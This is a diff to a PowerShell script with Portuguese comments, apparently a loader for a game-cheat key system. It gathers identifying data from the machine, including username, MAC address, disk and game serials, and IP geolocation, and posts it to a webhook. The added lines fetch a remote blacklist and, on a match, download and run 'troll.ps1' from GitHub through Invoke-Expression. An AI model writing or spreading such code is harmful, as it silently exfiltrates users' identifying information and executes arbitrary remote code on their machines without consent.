@@ -19,7 +19,6 @@ try {
 
 # Webhook
 $wbhUrl = "$pBin"
-
 # Infos básicas
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
@@ -33,6 +32,7 @@ $cpu = (Get-CimInstance Win32_Processor).Name
 $ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) + " GB"
 $mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
 $serial = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6\Settings\general").serial
+$serialc = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").VolumeSerialNumber
 $uptime = ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
 $uptime = (Get-Date) - $uptime
 $uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
@@ -68,7 +68,6 @@ function RemoverAcentosAuto {
 
 $city = "Indisponível"
 $zipcode = "Indisponível"
-
 try {
     $resp = Invoke-RestMethod -Uri "https://freegeoip.app/json/" -TimeoutSec 5
     if ($resp.city) {
@@ -78,7 +77,7 @@ try {
         $zipcode = $resp.zip_code
     }
 } catch {}
-# Embed
+
 $embed = @{
     title = "Log $username"
     color = 12292031
@@ -101,15 +100,15 @@ $embed = @{
         	@{ name = "País"; value = $country; inline = $true },
         	@{ name = "Maps"; value = $mapsLink; inline = $true },
 		@{ name = "Serial"; value = $serial; inline = $true },
-		@{ name = "Ligado"; value = $uptimeStr; inline = $true }
+		@{ name = "Ligado"; value = $uptimeStr; inline = $true },
+		@{ name = "Disk Number"; value = $serialc; inline = $true }
     )
 }
 # Envia
 $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
 Invoke-RestMethod -Uri $wbhUrl -Method Post -Body $payload -ContentType 'application/json'
 
-
-# Key Loader + Registro
+#Key
 $authFilePath = "C:\ProgramData\AMD\Key.Auth"
 $authRegPath = "HKCU:\Software\KeyAuth"
 $authDir = Split-Path $authFilePath
@@ -128,6 +127,28 @@ if (Test-Path $authFilePath) {
     Set-ItemProperty -Path $authRegPath -Name "AuthBypass" -Value 1 -Force
 } else {
     Set-ItemProperty -Path $authRegPath -Name "AuthBypass" -Value 0 -Force
+}
+
+#BlackList
+$BlacklistURL = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/blacklist.txt"
+$UserName = $env:USERNAME
+$Mac = (Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1).MacAddress
+$Serial = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").VolumeSerialNumber
+$Identificador = "$UserName $Mac $Serial"
+try {
+    $Blacklist = Invoke-WebRequest -Uri $BlacklistURL -UseBasicParsing
+    $Linhas = $Blacklist.Content -split "`n"
+
+    if ($Linhas -contains $Identificador) {
+        Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/castielwallker/whysistem/raw/refs/heads/main/troll.ps1" -UseBasicParsing).Content
+        exit 1 
+    }
+    else {
+        Write-Host "[+] - Usuário limpo. Continuando execução..."
+    }
+}
+catch {
+    Write-Warning "[!] - Erro ao verificar a blacklist: $_"
 }
 
 # Criar Ponto 
